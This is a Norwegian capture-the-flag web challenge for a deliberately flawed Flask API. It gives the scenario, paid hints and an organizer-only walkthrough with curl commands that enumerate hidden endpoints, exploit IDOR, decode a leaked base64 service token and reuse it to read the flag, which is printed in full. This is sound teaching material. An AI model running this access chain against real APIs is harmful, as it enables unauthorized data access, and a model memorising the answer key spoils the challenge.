# Historikkarkivet

**Kategori:** Web
**Poeng:** 500
**Type:** Container (Flask REST API)
**Vanskelighetsgrad:** Vanskelig
**Container:** 4 av 10

---

## Scenario

Nordverk har satt opp en REST API for å eksponere prosessdata fra
historikk-databasen til interne dashboards. API-et skal kun gi tilgang
til offentlige sensordata, men et internt sikkerhetsteam mistenker at
tilgangskontrollene ikke er implementert korrekt.

Utforsk API-et grundig. Finn ut hva som egentlig er tilgjengelig, og
hva som burde vært låst ned.

---

## Tilkobling

```
http://<IP>:8080
```

Landing page viser dokumenterte endepunkter. Men er det alt?

---

## Flaggformat

```
CTF{...}
```

---

## Hints

| Kostnad | Hint |
|---------|------|
| 25 poeng | API-et har flere endepunkter enn de dokumenterte. Prøv vanlige stier. |
| 50 poeng | Bare 3 sensorer er "offentlige", men finnes det flere? Hva skjer om du endrer ID? |
| 75 poeng | En av loggpostene inneholder kodet data. Sjekk feltnavn nøye. |
| 100 poeng | Den kodede verdien er tekstvennlig og kan dekodes med vanlige base64-verktøy. |
| 150 poeng | Noen API-endepunkter forventer Bearer-token. Let etter hvor en slik verdi kan lekke. |

---

## Løsningsvei (kun for arrangør)

### Steg 1 — Endepunkt-enumering

Landing page dokumenterer kun `/api/v1/sensors`, `/api/v1/sensors/<id>`, og
`/api/v1/sensors/<id>/logs`. Men det finnes to skjulte endepunkter:

```bash
curl http://<IP>:8080/api/v1/debug/endpoints
```

Returnerer full liste inkl. `/api/v1/admin/flag` og `/api/v1/debug/endpoints`.

### Steg 2 — IDOR

`/api/v1/sensors` lister kun sensor 1-3 (offentlige). Men det finnes 7 sensorer.
Ingen tilgangskontroll på `/api/v1/sensors/<id>` eller `/api/v1/sensors/<id>/logs`:

```bash
curl http://<IP>:8080/api/v1/sensors/7
curl http://<IP>:8080/api/v1/sensors/7/logs
```

Sensor 7 (SYS-MAINT) er merket "restricted" men returnerer data likevel.

### Steg 3 — Base64-dekoding

En av loggpostene i sensor 7 har et `data`-felt med base64-kodet JSON:

```bash
echo "eyJzZXJ2aWNlIjogImhpc3..." | base64 -d
```

Returnerer:
```json
{
  "service": "historian-admin",
  "token": "svc-hist-4f8a2c1e-9d3b",
  "note": "auto-generated service token — rotate before next maintenance window"
}
```

### Steg 4 — Hent flagget

```bash
curl -H "Authorization: Bearer svc-hist-4f8a2c1e-9d3b" \
     http://<IP>:8080/api/v1/admin/flag
```

**Flagg:** `CTF{h1st0r14n_1d0r_ch41n_c0mpl3t3}`
